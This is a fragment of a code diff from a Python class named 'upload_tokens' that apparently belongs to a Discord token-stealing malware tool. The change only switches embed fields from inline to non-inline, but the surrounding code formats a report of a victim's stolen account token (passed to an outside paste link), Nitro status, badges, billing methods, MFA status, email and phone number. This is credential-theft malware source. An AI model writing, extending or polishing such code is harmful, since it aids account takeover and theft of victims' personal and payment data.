@@ -354,20 +354,20 @@ class upload_tokens:
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
                             value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n ", inline=False)
             embed.add_field(
-                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
+                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=False)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:",
-                            value=f"{badges if badges != '' else 'None'}", inline=True)
+                            value=f"{badges if badges != '' else 'None'}", inline=False)
             embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
-                            value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+                            value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
             embed.add_field(name="<:mfa:1021604916537602088> MFA:",
-                            value=f"{mfa}", inline=True)
+                            value=f"{mfa}", inline=False)
 
             embed.add_field(name=" ", value=" ", inline=False)
 
             embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
-                            value=f"{email if email != None else 'None'}", inline=True)
+                            value=f"{email if email != None else 'None'}", inline=False)
             embed.add_field(name="<:starxglow:996004217699434496> Phone:",
-                            value=f"{phone if phone != None else 'None'}", inline=True)
+                            value=f"{phone if phone != None else 'None'}", inline=False)
 
             embed.add_field(name=" ", value=" ", inline=False)
 
